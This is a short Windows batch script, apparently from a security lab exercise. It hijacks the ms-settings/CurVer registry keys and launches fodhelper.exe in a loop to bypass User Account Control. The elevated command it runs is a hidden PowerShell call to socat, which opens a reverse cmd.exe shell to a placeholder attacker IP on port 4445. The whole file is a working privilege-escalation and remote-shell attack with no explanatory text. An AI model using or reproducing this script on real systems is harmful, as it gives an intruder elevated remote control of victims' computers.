@echo off
setlocal EnableExtensions

REM set REG_KEY=HKCU\Software\Classes\.thm\Shell\Open\command
set CMD="powershell -windowstyle hidden C:\Tools\socat\socat.exe TCP:'ATTACKER IP':4445 EXEC:cmd.exe,pipes"

:loop
reg add "HKCU\Software\Classes\.thm\Shell\Open\command" /d %CMD% /f
reg add "HKCU\Software\Classes\ms-settings\CurVer" /d ".thm" /f & fodhelper.exe

timeout /t 2 >nul
goto loop
